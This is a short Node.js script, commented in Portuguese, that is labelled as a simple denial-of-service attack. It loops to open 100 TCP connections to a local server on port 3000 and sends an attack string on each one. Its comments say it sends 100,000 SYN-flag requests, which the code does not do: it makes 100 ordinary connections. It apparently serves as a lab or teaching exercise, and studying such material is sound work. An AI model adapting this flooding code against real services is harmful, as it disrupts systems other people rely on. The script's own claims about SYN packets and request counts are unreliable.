const net = require('net');
//destino
const hostname = '127.0.0.1';
const port = 3000;

// Envia 100.000 requisições para o servidor com a flag SYN
for (let i = 0; i < 100; i++) {
  const socket = new net.Socket();

  console.log('Conexão solicitada.')
  socket.connect(port, hostname, () => {
    socket.write('Ataque DoS simples', 'utf-8' , () => {
      socket.end();
    });
  });
}

console.log('Ataque DoS com flag SYN enviado');